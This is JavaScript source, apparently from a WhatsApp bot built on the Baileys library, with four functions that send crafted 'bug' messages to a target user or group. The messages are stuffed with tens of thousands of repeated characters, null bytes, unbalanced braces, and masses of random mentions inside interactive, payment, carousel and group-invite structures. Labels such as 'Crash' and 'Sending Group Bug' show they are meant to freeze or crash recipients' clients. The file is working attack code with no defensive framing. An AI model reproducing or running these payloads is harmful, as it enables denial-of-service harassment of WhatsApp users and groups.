async function FrezeXblankgrub(sock, target) {
try {
  const videoPayload = await prepareWAMessageMedia(
    {
      video: { url: "https://files.catbox.moe/74v4yo.mp4", gifPlayback: true }
    },
    {
      upload: sock.waUploadToServer,
      mediaType: "video"
    }
  )

  for (let i = 0; i < 1; i++) {
    const msg = generateWAMessageFromContent(
      target,
      proto.Message.fromObject({
        interactiveMessage: {
          contextInfo: {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 999,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363399013145023@newsletter",
              newsletterName: "https://amelia.overload",
              serverMessageId: 1
            }
          },
          header: {
            title: "",
            ...videoPayload,
            hasMediaAttachment: true
          },
          body: { text: "KLIK INI BANG" },
          footer: { text: "" },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: `{"title":"${"Í¶æ".repeat(
                  10000
                )}","sections":[{"title":"Crash","rows":[]}]}`
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  screen_1_TextInput_0: "radio - buttons" + "\0".repeat(10000),
                  screen_0_Dropdown_1: "Null",
                  flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                }),
                version: 3
              }
            ]
          }
        }
      }),
      { userJid: target }
    )

    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id
    })
  }
  } catch (e) {
    console.error("Error kirim BlankMessage:", e)
  }
}

async function XfloidCrashInfinityGroup(sock, target, ptcp = true) {
try {
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { text: '' },
          footer: { text: '' },
          carouselMessage: {
            cards: [
              {
                header: {
                  title: '',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQMcsHgJduBlnnAdYUKKvZR6K68unf7-QyUGxiAbmersAyOKWrWQImD-HxZQ4Edsbe4z4Vf69d1cl2NNH94TEeYQxUJKVKAHayLoQONY-w?ccb=9-4&oh=01_Q5Aa1gFIJSOQsH5-cmce_ee4C_CiwYWMbABLd7WBq96f8N-BbA&oe=686B2C5A&_nc_sid=e6ed6c&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "DB/+n19HzggqZQiywcEYAlHH50RbEI0pwXrxD5kkLlA=",
                    fileLength: "178006",
                    height: 1,
                    width: 1,
                    mediaKey: "k6jdnVseHd/eIGBEEkBdtLqwr5L1I7X+jH5WStYQ1tY=",
                    fileEncSha256: "7cEoBgfRxb44DFjw8j+Zjy8GniEqoXWTw1DD98V4eVQ=",
                    directPath: "/o1/v/t24/f2/m234/AQMcsHgJduBlnnAdYUKKvZR6K68unf7-QyUGxiAbmersAyOKWrWQImD-HxZQ4Edsbe4z4Vf69d1cl2NNH94TEeYQxUJKVKAHayLoQONY-w?ccb=9-4&oh=01_Q5Aa1gFIJSOQsH5-cmce_ee4C_CiwYWMbABLd7WBq96f8N-BbA&oe=686B2C5A&_nc_sid=e6ed6c",
                    mediaKeyTimestamp: "1749267080",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAADAQEBAQAAAAAAAAAAAAAAAgMEAQYFAQEBAQEAAAAAAAAAAAAAAAABAAID/9oADAMBAAIQAxAAAADzz0pLiXNIteDJdW5x50YZ9EmN2e9ayc38jFx8cwKFau5d5urP3XGXNHIxR35TcjMHam/5tnhvSHTux2VaGzRuczhrCMFKBDIFN0DSAOf/xAAlEAACAQQCAgIDAQEAAAAAAAABAgADERIhBDETQRQiQlGRYbH/2gAIAQEAAT8AAvMYOKHQMPYnwWGy4nwTjfISlxVdX3sGfCNgQ0q8VqYBuCIREp39woR+M8jrit9Azz0jlo7nmphdXicimoIUdjc4xJX7Eytx6a0i1/UMXuB7e54gwBvDwwGAL9wcS4YBujPhfprxSaGtESryXraJhEVY6+wJxr+AkLfccvUCaXRjpiUAYAHZi1CCWxBPQPqctgyKQtoi+yNwjRiPTCFSPtAJQJSkw/EmKhyvnGcoSDY76lUs9NAoxEqlXCix1LWlR6ZQBRsdxO4i/wDJTRioWYtlphf1ClwQT95SCUkPlOyJVAIWxFoy2BtG7Mp2yEFTF1W2iJVqMuOMavZg1j1PMQQxJJJ6lSoXJKk7lO5JJ2I707ECMNmI24KhM8thcxGR2s39mND9mMyq1l/s8utQts/7G9wQNC0zI9zytiBeZk9mBoWjNP/EABkRAAIDAQAAAAAAAAAAAAAAAAERAAgIf/aAAgBAgEBPwCd0rAWAKZjMG//xAAfEQEAAgICAgMAAAAAAAAAAAABAAIDERASEyExQUL/2gAIAQMBAT8AgDGs1w1113LPV1G9n5mvVX7ZajMl+xWPA6ay+TbDbqGKv6fc8eOXo1jBSKxssLOuP//Z",
                    scansSidecar: "gEedIqFUVuURFyxuDXiES/ApmRF2SvVhKGpUjvrdz/JxAEcwvuFtiA==",
                    scanLengths: [19972, 38699, 68065, 51270]
                  },
                  hasMediaAttachment: true,
                },
                body: { text: "Í¶Ω".repeat(10000) },
                footer: { text: "üá∑üá∫ÂπªÊÉ≥ü©∏Ã∑ùôâùô§ùôöùô®ùôØùôîùô™ùôû ( ùêÇùöØùêëùêÑ )" },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(10000),
                  buttons: [
                    { name: "review_order", buttonParamsJson: "" },
                    { name: "review_and_pay", buttonParamsJson: "" },
                  ],
                },
              },
            ],
          },
          contextInfo: {
            mentionJid: Array.from({ length: 100 }, () => 
              `1${Math.floor(Math.random() * 50000000000)}@s.whatsapp.net`
            ),
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: { text: "Sent", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "üá∑üá∫",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: target
          }
        }
      }
    }
  }, { participant: { jid: target } });

  let msg = await generateWAMessageFromContent(target, {
    interactiveMessage: {
      header: {
        title: "",
        hasMediaAttachment: false
      },
      body: {
        text: "üá∑üá∫ÂπªÊÉ≥ü©∏Ã∑ùôâùô§ùôöùô®ùôØùôîùô™ùôû ( ùêÇùöØùêëùêÑ )",
      },
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10),
        buttons: [
          {
            name: "payment_method",
            buttonParamsJson: JSON.stringify({
              reference_id: null,
              payment_method: "{".repeat(100),
              payment_timestamp: null,
              share_payment_status: true,
            }),
          }
        ]
      }
    }
  }, {});

  await sock.relayMessage(
    target,
    msg.message,
    {
      ...(ptcp ? { participant: { jid: target } } : {}),
      additionalNodes: [
        { 
          tag: "biz", 
          attrs: { 
            native_flow_name: "payment_method",
            group_jid: target
          } 
        },
        {
          tag: "meta",
          attrs: { is_group_message: "true" },
          content: undefined
        }
      ]
    }
  );

  console.log(chalk.green(`Sending Group Bug To ${target}`));
  } catch (e) {
    console.error("Error kirim:", e)
  }
}

async function protocolbug10Group(sock, target, mention) {
try {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".nortexz" + "·üÑ·üù".repeat(10000),
        title: "NoeszYui",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "–ü”®Œ£∆ßZY–¶I ‚ú¶ êåÇêçâêåçêåÇêåñêåÑêçÇêçÇêçâêçÇ",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "‡ºø‡ºë·ú≥–ü”®Œ£∆ßZY–¶I·¢∂‚Éü"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    for (let i = 0; i < 1; i++) {
        const msg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: { videoMessage }
            }
        }, {});

        await sock.relayMessage(target, msg.message, {
            messageId: msg.key.id,
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: mentionedList.map(jid => ({
                                tag: "to",
                                attrs: { jid: jid },
                                content: undefined
                            }))
                        }
                    ]
                }
            ]
        });

        if (mention) {
            await sock.relayMessage(target, {
                groupMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 14
                        }
                    }
                }
            }, {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_group_mention: "true" },
                        content: undefined
                    }
                ]
            });
        }

        console.log(`SUCCES SEND TO GROUP`);
        
        if (i < 10) {
            await new Promise(resolve => setTimeout(resolve, 3000));
        }
    }
    } catch (e) {
    console.error("Error kirim:", e)
  }
}

async function groupInInvis(sock, target) {
try {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                groupInviteMessage: {
                    groupJid: "X",
                    inviteCode: "X",
                    inviteExpiration: "X",
                    groupName: "\u0000".repeat(9999),
                    caption: "\u0000".repeat(9999),
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 30000
                        }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: target
                    },
                    content: undefined
                }]
            }]
        }]
    });
    } catch (e) {
    console.error("Error kirim:", e)
  }
}